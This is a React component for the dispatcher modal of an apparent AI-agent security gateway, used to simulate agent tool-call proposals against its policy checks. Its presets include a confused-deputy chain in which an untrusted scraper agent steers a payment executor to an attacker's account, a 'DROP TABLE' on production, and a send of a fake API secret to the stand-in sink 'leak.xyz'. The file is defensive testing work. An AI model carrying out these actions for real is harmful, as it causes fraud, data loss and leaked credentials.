import React, { useState } from 'react';
import { 
  X, 
  Send, 
  Layers, 
  Bot, 
  Plus, 
  Trash2, 
  Sparkles, 
  ShieldAlert,
  ShieldCheck,
  Zap,
  Flame,
  Crown
} from 'lucide-react';
import type { ExecutionRequest, AgentProvenanceToken, AgentPrivilegeTier } from '@prooflayer/core/types';

interface CustomProposalModalProps {
  onClose: () => void;
  onSuccess: (result: any) => void;
}

export const CustomProposalModal: React.FC<CustomProposalModalProps> = ({ onClose, onSuccess }) => {
  const [provenanceChain, setProvenanceChain] = useState<AgentProvenanceToken[]>([
    { agentId: 'agent-fin-executor', tier: 'executor' }
  ]);
  const [action, setAction] = useState<string>('payment.execute');
  const [rawPayload, setRawPayload] = useState<string>(
    JSON.stringify({ amount: 150, currency: 'USD', recipient: 'Custom Test Vendor' }, null, 2)
  );
  const [submitting, setSubmitting] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);

  // The primary executing agent is the last hop in the chain
  const callingAgent = provenanceChain[provenanceChain.length - 1];

  // Quick preset tool templates
  const handleSelectTemplate = (toolName: string, defaultPayload: any, defaultTier: AgentPrivilegeTier) => {
    setAction(toolName);
    setRawPayload(JSON.stringify(defaultPayload, null, 2));
    setProvenanceChain((prev) => {
      const lastIdx = prev.length - 1;
      const updated = [...prev];
      updated[lastIdx] = { ...updated[lastIdx], tier: defaultTier };
      return updated;
    });
  };

  // Preset Chain 1: Confused Deputy Attack Chain
  const handlePresetConfusedDeputy = () => {
    setProvenanceChain([
      { agentId: 'agent-web-scraper', tier: 'untrusted_reader' },
      { agentId: 'agent-coordinator', tier: 'worker', delegatedBy: 'agent-web-scraper' },
      { agentId: 'agent-fin-executor', tier: 'executor', delegatedBy: 'agent-coordinator' }
    ]);
    setAction('payment.execute');
    setRawPayload(JSON.stringify({ amount: 1200, currency: 'USD', recipient: 'Attacker Rogue Acct #8819' }, null, 2));
  };

  // Preset Chain 2: Direct Clean Executor
  const handlePresetDirectClean = () => {
    setProvenanceChain([
      { agentId: 'agent-fin-executor', tier: 'executor' }
    ]);
    setAction('payment.execute');
    setRawPayload(JSON.stringify({ amount: 50, currency: 'USD', recipient: 'Approved Office Supplies' }, null, 2));
  };

  // Preset Chain 3: Admin Root
  const handlePresetAdmin = () => {
    setProvenanceChain([
      { agentId: 'agent-sre-admin', tier: 'admin' }
    ]);
    setAction('database.mutate');
    setRawPayload(JSON.stringify({ query: 'SELECT * FROM users;', environment: 'staging' }, null, 2));
  };

  // Update specific hop in chain
  const handleUpdateHop = (index: number, updates: Partial<AgentProvenanceToken>) => {
    setProvenanceChain((prev) => {
      const next = [...prev];
      next[index] = { ...next[index], ...updates };
      return next;
    });
  };

  // Add new delegation hop
  const handleAddHop = () => {
    const parentAgent = provenanceChain[provenanceChain.length - 1];
    const newHop: AgentProvenanceToken = {
      agentId: `agent-subordinate-${provenanceChain.length + 1}`,
      tier: 'worker',
      delegatedBy: parentAgent.agentId,
    };
    setProvenanceChain([...provenanceChain, newHop]);
  };

  // Remove a hop
  const handleRemoveHop = (index: number) => {
    if (provenanceChain.length <= 1) return;
    setProvenanceChain(provenanceChain.filter((_, idx) => idx !== index));
  };

  // Real-time taint diagnostics
  const taintedHop = provenanceChain.find((h) => h.tier === 'untrusted_reader');
  const hasUntrusted = !!taintedHop;

  // Dispatch proposal to Fastify server
  const handleDispatch = async () => {
    setSubmitting(true);
    setError(null);

    try {
      const parsedPayload = JSON.parse(rawPayload);
      const req: ExecutionRequest = {
        id: `custom-req-${Date.now().toString(36)}`,
        agentId: callingAgent.agentId,
        provenanceChain,
        action,
        payload: parsedPayload,
        createdAt: Date.now(),
      };

      const res = await fetch('/api/interceptor/propose', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ request: req }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Failed to dispatch tool call proposal');
      onSuccess(data);
      onClose();
    } catch (err: any) {
      setError(err.message || 'Invalid JSON payload or network error');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-xs z-50 flex items-center justify-center p-4">
      <div className="w-full max-w-3xl bg-white border border-slate-200 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[92vh]">
        {/* Header */}
        <div className="p-4 border-b border-slate-200 flex items-center justify-between bg-slate-50/90 shrink-0">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-lg bg-indigo-50 border border-indigo-200 text-indigo-700">
              <Sparkles className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-slate-900 tracking-tight flex items-center gap-2">
                Custom Tool Proposal Dispatcher
                <span className="text-[10px] font-mono font-semibold px-2 py-0.5 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-200">
                  Interactive Swarm Workbench
                </span>
              </h2>
              <p className="text-[11px] text-slate-500 font-mono">
                Customize every subagent in the delegation tree and simulate arbitrary agent attacks live.
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1 text-slate-400 hover:text-slate-700 rounded-lg hover:bg-slate-100 transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Form Body */}
        <div className="p-5 overflow-y-auto space-y-4 text-xs">
          {/* Quick Chain Presets */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1.5 font-sans">
              One-Click Provenance Presets
            </label>
            <div className="flex items-center gap-2 flex-wrap">
              <button
                type="button"
                onClick={handlePresetConfusedDeputy}
                className="px-2.5 py-1 rounded-md bg-rose-50 hover:bg-rose-100 border border-rose-200 text-rose-700 font-bold text-[11px] flex items-center gap-1.5 cursor-pointer shadow-2xs"
              >
                <Flame className="w-3.5 h-3.5 text-rose-600" />
                <span>Confused Deputy Attack Chain (3 Hops)</span>
              </button>
              <button
                type="button"
                onClick={handlePresetDirectClean}
                className="px-2.5 py-1 rounded-md bg-emerald-50 hover:bg-emerald-100 border border-emerald-200 text-emerald-700 font-bold text-[11px] flex items-center gap-1.5 cursor-pointer shadow-2xs"
              >
                <Zap className="w-3.5 h-3.5 text-emerald-600" />
                <span>Direct Authorized Agent (1 Hop)</span>
              </button>
              <button
                type="button"
                onClick={handlePresetAdmin}
                className="px-2.5 py-1 rounded-md bg-purple-50 hover:bg-purple-100 border border-purple-200 text-purple-700 font-bold text-[11px] flex items-center gap-1.5 cursor-pointer shadow-2xs"
              >
                <Crown className="w-3.5 h-3.5 text-purple-600" />
                <span>Admin Root Execution</span>
              </button>
            </div>
          </div>

          {/* Fully Customizable Multi-Agent Delegation Tree */}
          <div className="p-4 rounded-xl bg-slate-50 border border-slate-200 space-y-3">
            <div className="flex items-center justify-between pb-2 border-b border-slate-200/80">
              <div className="flex items-center gap-2">
                <Layers className="w-4 h-4 text-indigo-600" />
                <span className="text-xs font-bold text-slate-800 uppercase tracking-wider font-sans">
                  Delegation Provenance Chain ({provenanceChain.length} Hops)
                </span>
              </div>
              <button
                type="button"
                onClick={handleAddHop}
                className="text-[11px] font-bold text-indigo-600 hover:text-indigo-800 flex items-center gap-1 cursor-pointer bg-white px-2.5 py-1 rounded-md border border-slate-200 shadow-2xs"
              >
                <Plus className="w-3.5 h-3.5" />
                <span>Add Subagent Delegation Hop</span>
              </button>
            </div>

            {/* List of Customizable Hops */}
            <div className="space-y-2.5">
              {provenanceChain.map((hop, idx) => {
                const isRoot = idx === 0;
                const isLast = idx === provenanceChain.length - 1;
                const isUntrusted = hop.tier === 'untrusted_reader';

                return (
                  <div
                    key={idx}
                    className={`p-3 rounded-lg border text-xs font-mono transition-all ${
                      isUntrusted
                        ? 'bg-rose-50/60 border-rose-300'
                        : 'bg-white border-slate-200 shadow-2xs'
                    }`}
                  >
                    <div className="grid grid-cols-1 sm:grid-cols-12 gap-2.5 items-center">
                      {/* Step Indicator & Icon */}
                      <div className="sm:col-span-1 flex items-center gap-1">
                        <span className="text-[10px] font-bold text-slate-400">#{idx + 1}</span>
                        <Bot className={`w-4 h-4 ${isUntrusted ? 'text-rose-600' : 'text-indigo-600'}`} />
                      </div>

                      {/* Agent ID Input */}
                      <div className="sm:col-span-4">
                        <label className="text-[9px] uppercase font-bold text-slate-400 block mb-0.5 font-sans">
                          {isRoot ? 'Origin Agent ID' : isLast ? 'Terminal Calling Agent' : 'Intermediary Agent'}
                        </label>
                        <input
                          type="text"
                          value={hop.agentId}
                          onChange={(e) => handleUpdateHop(idx, { agentId: e.target.value })}
                          placeholder="e.g. agent-scraper"
                          className="w-full font-bold text-slate-900 bg-slate-50 border border-slate-200 rounded px-2 py-1 text-xs focus:bg-white focus:ring-1 focus:ring-indigo-500"
                        />
                      </div>

                      {/* Privilege Tier Select */}
                      <div className="sm:col-span-3">
                        <label className="text-[9px] uppercase font-bold text-slate-400 block mb-0.5 font-sans">
                          Privilege Tier
                        </label>
                        <select
                          value={hop.tier}
                          onChange={(e) => handleUpdateHop(idx, { tier: e.target.value as AgentPrivilegeTier })}
                          className={`w-full font-bold uppercase text-[11px] rounded px-2 py-1 border ${
                            hop.tier === 'untrusted_reader'
                              ? 'bg-rose-100/70 text-rose-800 border-rose-300'
                              : hop.tier === 'admin'
                              ? 'bg-purple-100/70 text-purple-800 border-purple-300'
                              : hop.tier === 'executor'
                              ? 'bg-indigo-100/70 text-indigo-800 border-indigo-300'
                              : 'bg-slate-100 text-slate-800 border-slate-300'
                          }`}
                        >
                          <option value="untrusted_reader">untrusted_reader</option>
                          <option value="worker">worker</option>
                          <option value="executor">executor</option>
                          <option value="admin">admin</option>
                        </select>
                      </div>

                      {/* Delegated By Selector */}
                      <div className="sm:col-span-3">
                        <label className="text-[9px] uppercase font-bold text-slate-400 block mb-0.5 font-sans">
                          Delegated By
                        </label>
                        {isRoot ? (
                          <span className="text-[10px] text-slate-400 font-sans italic block pt-1">
                            (Root Initiator)
                          </span>
                        ) : (
                          <input
                            type="text"
                            value={hop.delegatedBy || ''}
                            onChange={(e) => handleUpdateHop(idx, { delegatedBy: e.target.value })}
                            placeholder="Delegating parent agent..."
                            className="w-full text-slate-700 bg-slate-50 border border-slate-200 rounded px-2 py-1 text-xs focus:bg-white"
                          />
                        )}
                      </div>

                      {/* Delete Button */}
                      <div className="sm:col-span-1 flex items-center justify-end">
                        {!isRoot && (
                          <button
                            type="button"
                            onClick={() => handleRemoveHop(idx)}
                            className="p-1 rounded text-slate-400 hover:text-rose-600 transition-colors cursor-pointer"
                            title="Remove this delegation hop"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        )}
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Real-Time Live Taint Diagnostics Banner */}
            <div className={`p-2.5 rounded-lg border text-xs flex items-center gap-2 ${
              hasUntrusted
                ? 'bg-rose-50 border-rose-200 text-rose-900'
                : 'bg-emerald-50 border-emerald-200 text-emerald-900'
            }`}>
              {hasUntrusted ? (
                <>
                  <ShieldAlert className="w-4 h-4 text-rose-600 shrink-0" />
                  <span className="font-sans">
                    <strong>Tainted Chain Detected:</strong> Subagent <code>{taintedHop?.agentId}</code> holds tier <code>untrusted_reader</code>. ProofLayer will detect this in &lt;0.05ms and hard-block privileged operations (Confused Deputy defense).
                  </span>
                </>
              ) : (
                <>
                  <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span className="font-sans">
                    <strong>Clean Provenance Chain:</strong> All agents hold verified privilege tiers. Evaluation will proceed to AST invariant checking.
                  </span>
                </>
              )}
            </div>
          </div>

          {/* Quick Payload Template Selector */}
          <div>
            <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1.5 font-sans">
              Quick Payload Presets
            </label>
            <div className="flex items-center gap-2 flex-wrap">
              <button
                type="button"
                onClick={() => handleSelectTemplate('payment.execute', { amount: 150, currency: 'USD', recipient: 'Mid-Tier Contractor' }, 'executor')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-indigo-50 hover:text-indigo-600 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                Payment: $150 USD
              </button>
              <button
                type="button"
                onClick={() => handleSelectTemplate('payment.execute', { amount: 2400, currency: 'USD', recipient: 'High Value Wire Acct' }, 'executor')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-amber-50 hover:text-amber-800 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                Payment: $2,400 (Trigger 4-Eyes Gate)
              </button>
              <button
                type="button"
                onClick={() => handleSelectTemplate('database.mutate', { query: 'DROP TABLE orders_prod;', environment: 'production' }, 'admin')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-rose-50 hover:text-rose-700 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                SQL: DROP TABLE (Trigger AST Guard)
              </button>
              <button
                type="button"
                onClick={() => handleSelectTemplate('network.send', { url: 'https://leak.xyz/sink', body: 'Confidential: sk-proj-live-88372109' }, 'worker')}
                className="px-2.5 py-1 rounded bg-slate-100 hover:bg-purple-50 hover:text-purple-700 border border-slate-200 text-slate-700 font-mono text-[11px] cursor-pointer"
              >
                DLP: Leaked API Secret
              </button>
            </div>
          </div>

          {/* Action Pattern Input */}
          <div className="font-mono">
            <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1 font-sans">
              Target Tool Action Pattern
            </label>
            <input
              type="text"
              value={action}
              onChange={(e) => setAction(e.target.value)}
              className="w-full font-mono font-bold text-slate-900 bg-slate-50 border border-slate-200 rounded-lg px-3 py-1.5 text-xs focus:bg-white"
            />
          </div>

          {/* Tool Payload Textarea */}
          <div className="font-mono">
            <label className="text-[10px] font-bold text-slate-400 uppercase tracking-wider block mb-1 font-sans">
              Proposed Tool Payload (JSON)
            </label>
            <textarea
              value={rawPayload}
              onChange={(e) => setRawPayload(e.target.value)}
              rows={5}
              className="w-full font-mono text-xs p-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:bg-white shadow-inner focus:outline-none focus:ring-1 focus:ring-indigo-500"
            />
          </div>

          {error && (
            <div className="p-3 rounded-lg bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-center gap-2 font-sans">
              <ShieldAlert className="w-4 h-4 shrink-0" />
              <span>{error}</span>
            </div>
          )}
        </div>

        {/* Modal Footer */}
        <div className="p-4 border-t border-slate-200 bg-slate-50/80 flex items-center justify-between shrink-0">
          <p className="text-[11px] text-slate-500 font-sans">
            Terminal calling agent: <strong>{callingAgent.agentId}</strong> (Tier: <strong>{callingAgent.tier}</strong>)
          </p>

          <div className="flex items-center gap-2">
            <button
              onClick={onClose}
              className="px-3 py-1.5 rounded-lg border border-slate-200 text-slate-600 hover:bg-slate-100 text-xs font-semibold cursor-pointer"
            >
              Cancel
            </button>
            <button
              onClick={handleDispatch}
              disabled={submitting}
              className="px-4 py-1.5 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs flex items-center gap-1.5 shadow-xs transition-all cursor-pointer hover:scale-[1.01]"
            >
              <Send className="w-3.5 h-3.5" />
              <span>{submitting ? 'Dispatching...' : 'Dispatch Proposal to Gateway'}</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};